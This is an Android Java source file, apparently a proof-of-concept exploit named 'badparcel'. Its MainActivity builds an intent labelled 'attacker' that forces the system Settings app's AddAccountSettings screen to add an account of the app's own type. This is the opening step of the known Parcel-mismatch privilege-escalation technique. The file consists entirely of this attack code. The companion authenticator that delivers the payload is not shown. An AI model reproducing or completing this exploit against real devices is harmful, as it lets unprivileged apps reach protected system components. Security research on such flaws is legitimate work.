package com.example.badparcel;

import static android.content.ContentValues.TAG;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class  MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent attacker = new Intent();
        attacker.setComponent(new ComponentName("com.android.settings", "com.android.settings.accounts.AddAccountSettings"));
        attacker.setAction(Intent.ACTION_RUN);
        attacker.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        String authTypes[] = {"com.example.badparcel"};
        attacker.putExtra("account_types", authTypes);
        startActivity(attacker);

    }

}